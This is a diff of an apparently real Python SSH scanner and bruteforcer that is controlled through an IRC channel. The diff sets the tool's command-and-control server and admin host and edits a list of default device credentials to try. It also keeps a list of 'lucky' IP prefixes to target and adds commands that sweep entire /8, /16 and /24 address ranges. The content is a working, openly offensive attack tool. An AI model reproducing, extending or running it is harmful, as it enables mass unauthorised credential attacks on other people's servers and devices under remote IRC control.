@@ -1,7 +1,8 @@
 #!/usr/bin/env python
 # Spaggiari Scanner - Version 1.0b
+# A Secure Shell (SSH) scanner / bruteforcer controlled via the Internet Relay Chat (IRC) protocol.
 # Developed by acidvegas in Python 2.7
-# https://github.com/acidvegas/spaggiari/
+# https://github.com/acidvegas/spaggiari
 # spaggiari.py
 
 """
@@ -20,9 +21,9 @@ Commands:
  - @stop      | Stop all current running scans.
  - @version   | Information about the scanner.
 
-
- ToDo:
-- Fix up the @scan and @stop commands.
+ Todo:
+ - Fix up the @scan and @stop commands.
+ - Add bad ip range blocklist.
 """
 
 import datetime
@@ -38,8 +39,8 @@ import threading
 import time
 import urllib2
 
-# Main IRC Config
-server   = 'irc.server.com'
+# IRC Config
+server   = 'irc.supernets.org'
 port     = 6697
 use_ssl  = True
 password = None
@@ -47,7 +48,7 @@ channel  = '#dev'
 key      = None
 
 # Other Config
-admin_host   = 'server.admin'
+admin_host   = 'super.nets'
 control_char = '@'
 throttle     = 20
 
@@ -76,7 +77,7 @@ combos = [
     'root:openelec',
     'ubnt:ubnt',
     'user:acme',
-    'vyos:vyos',
+    'vyos:vyos'
 ]
 
 lucky = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','203.249','31.176','60.51','84.122''95.169','95.6','95.9']
@@ -330,14 +331,22 @@ class IRC(object):
             elif len(args) >= 3:
                 if cmd == 'scan' and args[1] == self.id:
                     if not self.scanning:
-                        if args[2] == 'lucky':
+                        if args[2] == 'a':
+                            a_range = args[3]
+                            start   = a_range + '.0.0.0'
+                            end     = a_range + '.255.255.255'
+                        elif args[2] == 'b':
+                            b_range = args[3]
+                            start   = b_range + '.0.0'
+                            end     = b_range + '.255.255'
+                        elif args[2] == 'c':
+                            c_range = args[3]
+                            start   = c_range + '.0'
+                            end     = c_range + '.255'
+                        elif args[2] == 'lucky':
                             lucky_range = random.choice(lucky)
                             start       = lucky_range + '.0.0'
                             end         = lucky_range + '.255.255'
-                        elif args[2] == 'random':
-                            random_range = random_int(1,255) + '.' + random_int(0,255)
-                            start        = random_range + '.0.0'
-                            end          = random_range + '.255.255'
                         else:
                             start = args[2]
                             end   = args[3]
